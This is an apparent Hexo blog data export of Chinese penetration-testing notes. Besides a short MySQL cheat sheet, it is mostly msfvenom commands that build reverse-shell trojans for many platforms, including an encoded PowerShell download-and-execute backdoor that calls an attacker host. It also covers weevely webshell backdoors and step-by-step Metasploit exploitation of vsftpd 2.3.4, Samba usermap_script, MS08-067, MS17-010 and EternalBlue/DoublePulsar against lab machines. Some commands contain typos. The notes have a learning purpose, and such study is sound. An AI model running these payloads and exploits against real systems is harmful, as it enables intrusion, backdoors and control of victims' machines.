{"meta":{"title":"一日看尽长安花","subtitle":"","description":"一生忠于热爱","author":"南北_","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"Mysql数据库","slug":"Mysql数据库","date":"2019-12-07T12:20:17.000Z","updated":"2019-12-08T01:14:59.647Z","comments":true,"path":"2019/12/07/Mysql数据库/","link":"","permalink":"http://yoursite.com/2019/12/07/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"mysql登录： mysql -h地址 -P端口 -u用户名 -p密码 登陆本地只能使用mysql -u用户名 -p密码 修改密码： set password = password（’123456’）; 查看库： show databases； 创建库： create database 库名； 进入库： use 库名； 创建表： create table 表名； create table 表名 ( 字段名 数据类型 )； 默认为null 删除库： drop database 库名； 删除表： drop table 表名； 查看表： desc 表名； 查看表里的数据： select * from 表名； 插入数据： insert into 表名（字段名） values （“xxx”）； 修改数据： update 表名 set 字段 = ‘xxx’ where 字段 = ‘xxx’； 修改字段： alter table 表名 change 修改前的字段名 修改后的字段名 数据类型； 删除一行数据： delete from 表名 where “删除的项”；","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"msfvenom生成木马","slug":"msfvenom生成木马","date":"2019-12-07T08:32:54.000Z","updated":"2019-12-07T11:47:31.477Z","comments":true,"path":"2019/12/07/msfvenom生成木马/","link":"","permalink":"http://yoursite.com/2019/12/07/%C2%96msfvenom%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/","excerpt":"","text":"msfvenom生成shellcode： 简单生成： ​ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.133 LPORT=11111 -f exe -o /root/1.exe -p 指定payload，payload后跟该payload的选项 -o 指定payload的保存路径，包含文件名 替换指定代码： ​ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.132 LPORT=11111 -b ‘\\x00’ -f exe -o /root/1.exe -b 替换代码中会出现中断的字符，如 ‘\\x00\\xff’ 指定编码器： ​ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.132 LPORT=11111 -b ‘\\x00’ -e x86/shikata_ga_nai -f exe -o /root/1.exe -e 指定特定的编码器 Windows： ​ msfvenom –platform windows –a x86 –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\\back.exe​ msfvenom –platform windows –a x86 –p windows/x64/meterpreter/reverse_tcp –f exe –o C:\\back.exe Linux： msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf MAC： msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho PHP： msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw &gt; shell.php Asp： msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp Aspx： msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f aspx &gt; shell.aspx JSP： msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp War： msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war Bash： msfvenom -p cmd/unix/reverse_bash LHOST= LPORT=-f raw &gt; shell.sh Perl： msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl Python： msfvenom -p python/meterpreter/reverser_tcp LHOST= LPORT= -f raw &gt; shell.py exe 利用exec执行powershell后门: msfvenom -p windows/exec CMD=”powershell.exe -nop -w hidden -c $M=new-object net.webclient;$M.proxy=[Net.WebRequest]::GetSystemWebProxy();$M.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $M.downloadstring(‘http://192.168.157.132:8080/4WFjDXrGo7Mj&#39;);&quot; -f exe -e x86/shikata_ga_nai -i 6 -o msf.exe 列出所有可用的攻击载荷： 列出Windows平台下最为常见的payload个数： 查看excellent级的编码方式： 查看nops（空字段）选项： 查看可以生产的格式： 查看当前支持的平台：","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"weevely","slug":"weevely","date":"2019-12-07T07:54:50.000Z","updated":"2019-12-07T08:16:47.876Z","comments":true,"path":"2019/12/07/weevely/","link":"","permalink":"http://yoursite.com/2019/12/07/weevely/","excerpt":"","text":"基本命令格式： 后门生成参数： ​ generate.php（生成php后门文件） ​ generate.img（将后门代码插入到图片中，并修改.htaccess，该后门需要服务器开启.htaccess） ​ generate.htaccess（将后门代码插入到.htaccess，同样需要开启.htaccess支持） weevely generate 新建一个远程控制文件，文件使用密码password，path为生成的文件位置 weevely session 连接一个曾经连接过的session会话 weevely 连接一个远程的URL开启远程控制，使用远程控制文件密码password 使用.php文件远程控制 将该backdoor.php文件通过方法移动到Apache2服务器的根目录/var/www/html/ 通过weevely命令进行连接我们的远程控制文件（文件密码为字符串hello） 可以看到渗透成功，并且可以执行命令了","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"nikto","slug":"nikto","date":"2019-12-07T07:26:15.000Z","updated":"2019-12-07T07:44:09.903Z","comments":true,"path":"2019/12/07/nikto/","link":"","permalink":"http://yoursite.com/2019/12/07/nikto/","excerpt":"","text":"使用nikto进行Web扫描测试： ​ 靶机：Metasploitable （192.168.157.133） ​ 攻击机：Kali 2.0（192.168.157.132） 1.普通扫描 nikto -h 目标 2.扫描指定端口 nikto -h 目标 -p 端口 3.目录猜解 -C 指定CGI目录 –all表示猜解CGI目录 nikto -h 192.168.157.133 -C all 4.漏洞扫描 -T选项包含很多小选项 –T 9表示扫描SQL注入漏洞-T选项包含的小选项解释：0 检查文件上传页面1 检查web日志2 检查错误配置或默认文件3检查信息泄露问题4 检查XSS/Script/HTML问题5 从根目录检查是否存在可访问的文件6 检查拒绝服务问题7 从任意文件检索是否存在可访问文件8 检查是否存在系统命令执行漏洞9 检查SQL注入漏洞a 检查认证绕过问题b 识别安装的软件版本c 检查源代码泄露问题x 反向链接选项 例如：扫描sql注入漏洞 nikto -h 192.168.157.133 -T 9","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"w3af命令行模式","slug":"w3af命令行模式","date":"2019-12-07T06:02:27.000Z","updated":"2019-12-07T07:08:41.178Z","comments":true,"path":"2019/12/07/w3af命令行模式/","link":"","permalink":"http://yoursite.com/2019/12/07/w3af%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"使用w3af进行Web应用安全漏洞测试： ​ 靶机：Metasploitable （192.168.157.133） ​ 攻击机：Kali 2.0（192.168.157.132） 1.首先打开Kali 2.0终端输入w3af_console进入w3af命令行模式 2.help命令列出当前命令提示符下可用的命令 start | Start the scan. 开始扫描 plugins | Enable and configure plugins. 选择和配置插件 exploit | Exploit the vulnerability. 使用该模块进行攻击漏洞 profiles | List and use scan profiles. 列出可以用来扫描的文件 cleanup | Cleanup before starting a new scan. 在开始新扫描之前进行清理 version | Show w3af version information. 显示w3af版本信息 keys | Display key shortcuts. 显示关键快捷方式 http-settings | Configure the HTTP settings of the framework. 配置框架的HTTP设置 misc-settings | Configure w3af misc settings. 配置w3af misc设置 target | Configure the target URL. 配置目标URL back | Go to the previous menu. 返回前一目录 exit | Exit w3af. 退出 kb | Browse the vulnerabilities stored in the Knowledge Base 浏览存储在知识库中的漏洞 3.输入plugins，进入插件目录内，输入help显示当前可使用的命令 4.输入list audit列出audit插件类中的小插件 5.使用audit模块中的xss脚本攻击,sql注入,本地文件调用这三个插件,可以选用一个,也可以选用多个 6.使用audit模块中所有的插件进行扫描 7.输入crawl模块，按两次tab键，可以显示该模块下的插件，选择该模式下的web爬虫模块 8.进入profiles模块，这个模块用于自定义组合插件，当然w3af自定义了一些组合插件 9.列出在profiles模块下的插件 10.下面我们来用一下这些自定义插件 save_as test 使用save_as后面自定义一个文件名,表示将刚刚的配置存放在test文件内 save_as test self-contained 将test文件独立出来,以便供其他人使用 use test 使用自定义的test文件中的配置进行扫描 back 返回上一级 11.进入http-settings，设置全局参数 set | Set a parameter value. 设置参数值 save | Save the configured settings. 保存配置 set rand_user_agent True 设置随机用户代理浏览器,默认位w3af的代理,容易被管理员查看日志发现 12.进入misc-setting全局设置选项中 view 查看需要配置的参数 set fuzz_url_filenames True 设置对URL中的文件名进行模糊测试(Fuzz) 13.进入target模块，设置目标信息，输入help查看在此模式下可使用的命令 view 列出可用操作 set target http：//192.168.157.133 设置目标URL set target_os unix 设置目标系统为unix back 返回上级目录 start 开始扫描 Apache和PHP的版本也就被爆出来了，是不是很屌呢","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"Linux笑脸漏洞渗透","slug":"Linux笑脸漏洞渗透","date":"2019-12-07T03:11:39.000Z","updated":"2019-12-07T04:48:27.093Z","comments":true,"path":"2019/12/07/Linux笑脸漏洞渗透/","link":"","permalink":"http://yoursite.com/2019/12/07/Linux%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F/","excerpt":"","text":"通过vsftpd_234_backdoor学习msf对渗透的利用：（可攻击系统为vsftpd version 2到2.3.4） ​ 靶机：Linux（192.168.157.133） ​ 攻击机：Kali （192.168.157.132） 1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(vsftpd_234_backdoor对应的漏洞端口为21) 2.输入msfconsole进入搜索MS08_067可利用漏洞模块 3.利用漏洞模块，设置参数 msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor msf5 &gt; show optins msf5 &gt; set RHOSTS 192.168.157.133 msf5 &gt; exploit 可以看到漏洞利用成功，现在是 root最高权限,就可以对靶机进行为所欲为了","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"Linux通过smb服务渗透","slug":"Linux通过smb服务渗透","date":"2019-12-07T02:35:44.000Z","updated":"2019-12-07T03:05:49.273Z","comments":true,"path":"2019/12/07/Linux通过smb服务渗透/","link":"","permalink":"http://yoursite.com/2019/12/07/Linux%E9%80%9A%E8%BF%87smb%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/","excerpt":"","text":"通过usermap_script学习msf对渗透的利用：（可攻击系统为Linux3.X-4.X的SMB） ​ 靶机：Linux （192.168.157.133） ​ 攻击机：Kali （192.168.157.132） 1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(usermap_script对应的漏洞端口为139) 2.输入msfconsole进入搜索usermap_script可利用漏洞模块 3.利用漏洞模块，设置参数 msf5 &gt; use exploit/multi/samba/usermap_script msf5 &gt; set RHOSTS 192.168.157.133 msf5 &gt; show options msf5 &gt; exploit 可以看到漏洞利用成功，现在是 root最高权限,就可以对靶机进行为所欲为了","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"双脉冲星渗透","slug":"双脉冲星渗透","date":"2019-12-06T05:16:39.000Z","updated":"2019-12-07T01:30:23.994Z","comments":true,"path":"2019/12/06/双脉冲星渗透/","link":"","permalink":"http://yoursite.com/2019/12/06/%E5%8F%8C%E8%84%89%E5%86%B2%E6%98%9F%E6%B8%97%E9%80%8F/","excerpt":"","text":"通过双脉冲星学习msf对渗透的利用：（除win10以外的系统均可攻击） ​ 靶机：Windows xp（192.168.124.108） ​ 攻击机：Kali （192.168.124.106） 1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(08_067对应的漏洞端口为445) 2.将模块复制到msf目录下 3.输入msfconsole进入搜索eternalblue_doublepulsar可利用漏洞模块 4.利用漏洞模块，设置参数 msf &gt; use exploit/windows/smb/eternalblue_doublepulsar msf &gt; set RHOST 192.168.124.108 msf &gt; set payload windows/meterpreter/reverse_tcp msf &gt; set LHOST 192.168.124.1006 msf &gt; set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps msf &gt; set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps msf &gt; set PROCESSINJECT lsass.exe 可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"MS08_067渗透","slug":"MS08-067渗透","date":"2019-12-06T04:30:16.000Z","updated":"2019-12-06T05:12:35.008Z","comments":true,"path":"2019/12/06/MS08-067渗透/","link":"","permalink":"http://yoursite.com/2019/12/06/MS08-067%E6%B8%97%E9%80%8F/","excerpt":"","text":"通过MS08_067学习msf对渗透的利用：（可攻击系统为xp和Windows2003） ​ 靶机：Windows xp （192.168.124.15） ​ 攻击机：Kali （192.168.124.99） 1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(08_067对应的漏洞端口为445) 2.输入msfconsole进入搜索MS08_067可利用漏洞模块 3.利用漏洞模块，设置参数 msf5 &gt; use exploit/windows/smb/ms08_067_netapi msf5 &gt; set RHOSTS 192.168.124.15 msf5 &gt; set payload windows/meterpreter/reverse_tcp msf5 &gt; set LHOST 192.168.124.99 msf5 &gt; set target 34 msf5 &gt; exploit 可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"MS17_010渗透","slug":"MS17_010渗透","date":"2019-12-06T02:14:36.000Z","updated":"2019-12-06T04:38:07.887Z","comments":true,"path":"2019/12/06/MS17_010渗透/","link":"","permalink":"http://yoursite.com/2019/12/06/MS17_010%E6%B8%97%E9%80%8F/","excerpt":"","text":"通过MS17_010学习msf对渗透的利用：（可攻击系统为Win7和Windows2008） ​ 靶机：Windows 7 （192.168.157.135） ​ 攻击机：Kali （192.168.157.132） 1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(17_010对应的漏洞端口为445) 2.输入msfconsole进入搜索MS17_010可利用漏洞模块 3.利用漏洞模块，设置参数 msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue msf5 &gt; set RHOSTS 192.168.157.135 msf5 &gt; set payload windows/x64/meterpreter/reverse_tcp msf5 &gt; set LHOST 192.168.157.132 msf5 &gt; exploit 可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"}]}]}